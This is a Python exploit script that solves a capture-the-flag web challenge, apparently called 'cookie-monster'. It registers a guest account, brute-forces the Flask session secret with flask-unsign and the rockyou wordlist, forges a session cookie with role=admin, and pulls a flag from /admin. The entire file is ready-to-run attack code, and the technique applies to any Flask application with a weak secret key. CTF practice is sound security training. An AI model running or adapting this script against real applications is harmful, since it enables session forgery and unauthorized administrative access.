#!/usr/bin/env python3
"""
cookie-monster — exploit script
Usage: python exploit.py <host> <port>

Steps:
  1. Register + login as a guest to obtain a valid signed session cookie.
  2. Crack the Flask secret key offline using flask-unsign + a wordlist.
  3. Re-sign a forged cookie with role=admin.
  4. Hit /admin with the forged cookie and extract the flag.

Dependencies: flask-unsign, requests
  pip install flask-unsign requests
"""

import re
import sys
import subprocess
import requests
from pathlib import Path

WORDLIST = Path(__file__).parent / "rockyou.txt"


def main():
    host = sys.argv[1]
    port = int(sys.argv[2])
    base = f"http://{host}:{port}"

    s = requests.Session()

    # ── Step 1: Register a throwaway guest account ────────────────────────────
    username = "exploit_user"
    password = "exploit_pass"
    s.post(f"{base}/register", data={"username": username, "password": password})

    # ── Step 2: Login and grab the signed session cookie ─────────────────────
    s.post(f"{base}/login", data={"username": username, "password": password})
    cookie_value = s.cookies.get("session")
    if not cookie_value:
        print("[!] Failed to obtain session cookie after login.")
        sys.exit(1)

    # ── Step 3: Crack the secret key with flask-unsign ───────────────────────
    result = subprocess.run(
        [
            "flask-unsign",
            "--unsign",
            "--cookie",
            cookie_value,
            "--wordlist",
            str(WORDLIST),          # pass as string to be safe
            "--no-literal-eval",
        ],
        capture_output=True,
        text=True,
    )

    # flask-unsign may print just b'secret' on stdout, and status on stderr
    out = (result.stdout or "").strip()
    err = (result.stderr or "").strip()

    # Try format 1: "Secret key: <secret>"
    m = re.search(r"Secret key:\s*([^\s]+)", out)
    secret = None
    if m:
        secret = m.group(1)

    # Try format 2: "b'monstermaster'" (bytes literal)
    if secret is None:
        m = re.search(r"""^b['"](.+?)['"]$""", out)
        if m:
            secret = m.group(1)

    if not secret:
        print("[!] Could not crack the secret key.")
        print("stdout:", out)
        print("stderr:", err)
        sys.exit(1)

    # ── Step 4: Forge an admin session cookie ─────────────────────────────────
    forged = subprocess.run(
        [
            "flask-unsign", "--sign",
            "--cookie", f"{{'role': 'admin', 'username': '{username}'}}",
            "--secret", secret,
        ],
        capture_output=True, text=True
    )
    forged_cookie = forged.stdout.strip()
    if not forged_cookie:
        print("[!] Failed to forge cookie.")
        sys.exit(1)

    # ── Step 5: Hit /admin with the forged cookie ─────────────────────────────
    resp = requests.get(
        f"{base}/admin",
        cookies={"session": forged_cookie},
    )

    # ── Step 6: Extract the flag ──────────────────────────────────────────────
    flag = re.search(r"ictf\{[^}]+\}", resp.text)
    if flag:
        print(flag.group(0))
    else:
        print("[!] Flag not found in response.")
        print(resp.text[:500])


if __name__ == "__main__":
    main()
